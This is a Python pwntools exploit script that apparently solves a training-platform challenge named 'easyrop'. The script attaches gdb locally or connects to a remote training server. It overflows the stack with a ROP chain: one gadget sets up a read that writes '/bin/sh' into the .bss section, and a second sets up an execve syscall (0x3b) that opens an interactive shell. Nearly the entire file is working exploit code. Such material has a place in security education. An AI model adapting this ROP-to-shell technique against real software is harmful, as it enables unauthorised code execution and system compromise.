from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./easyrop")
    gdb.attach(r, """
            b *0x0040021f # after read
            c
                  """)
    input("wait")
else:
    r = remote("bin.training.offdef.it", 2015)


##### FUNCTIONS #####
def halfonstack(value):
    r.send(p32(value))
    r.send(p32(0))  # send 4 bytes with \x00


def onstack(value):
    onehalf = value & 0xffffffff  # 4 bytes
    otherhalf = value >> 32  # 4 bytes

    halfonstack(onehalf)
    halfonstack(otherhalf)


pop_rdi_rsi_rdx_rax = 0x04001c2  # gadget
read = 0x400144  # read function address taken from gidra
binsh = 0x600500  # .bss address taken from vmmap
syscall = 0x400168  # syscall address taken from gidra

############### ROP CHAIN #################
chain = [0x0] * 7
chain += [
    ######### FIRST CHAIN #########
    pop_rdi_rsi_rdx_rax,  # gadget
    0,  # rdi

    # write in .bss (always writable | I see the address of .bsswith vmmap)
    binsh,  # rsi
    8,  # rdx # write 8 bytes (/bin/sh/x00)
    0,  # rax
    read,  # read

    ######### SECOND CHAIN #########
    pop_rdi_rsi_rdx_rax,  # gadget
    binsh,  # rdi
    0,  # rsi
    0,  # rdx
    0x3b,  # rax
    syscall  # syscall address taken from gidra (whethever address is ok)
]

for i in chain:
    onstack(i)

r.send(b"\n")  # read 8 bytes
time.sleep(0.1)  # wait for read because the read is reading 8 bytes
# but it's up to the kernel to decide when to read
# (if we don't put it the two read will be done in one
# time and we don't want that)

r.send(b"\n")
time.sleep(0.1)

r.send(b"/bin/sh\x00")  # write /bin/sh in .bss

r.interactive()
